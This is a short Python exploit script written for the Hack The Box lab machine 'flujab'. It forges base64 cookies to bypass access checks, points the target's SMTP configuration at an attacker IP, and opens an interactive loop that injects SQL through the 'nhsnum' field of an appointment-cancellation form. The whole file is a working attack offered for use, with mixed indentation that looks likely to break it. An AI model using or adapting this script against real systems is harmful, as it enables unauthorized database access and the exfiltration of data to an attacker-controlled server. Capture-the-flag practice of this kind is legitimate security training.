#!/usr/bin/env python
# -*- coding: utf-8 -*-
# SQLi script i wrote for HTB machine flujab

import os
import sys
import requests
import base64
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) !=3:
        print ("Usage: python %s <attacker ip> <patient_cookie>" % sys.argv[0])
        sys.exit(1)

ip = sys.argv[1]
patient_cookie = sys.argv[2]

true = "=True"
add_true = patient_cookie + true
b64_add_true = bytes(add_true)
b64_registered = base64.b64encode(b64_add_true)
b64_registered = b64_registered.replace('=','%3D')
cookie_1 = {'Modus':'Q29uZmlndXJlPVRydWU%3D'}   # /?smtp_config
cookie_2 = {'Modus': 'Q29uZmlndXJlPVRydWU%3D','Registered': b64_registered}   # /?cancel
requests.get("https://freeflujab.htb/?smtp_config", cookies=cookie_1, verify=False)  # enter smtp config
requests.post("https://freeflujab.htb/?smtp_config", cookies=cookie_1, data={'mailserver': ip, 'port': '25', 'save':'Save+Mail+Server+Config'}, verify=False)

class flu(object):
        def __init__(self):
	    self.url = "https://freeflujab.htb/?cancel"

        def makeRequest(self, cmd):
	    requests.post(self.url, cookies=cookie_2, verify=False, data={'nhsnum': cmd, 'submit':'Cancel+Appointment'})

	def runCMD(self,cmd):
	    self.makeRequest(cmd)

o = flu()
while True:
	cmd = raw_input("MYSQLi> ")
	o.runCMD(cmd)
        
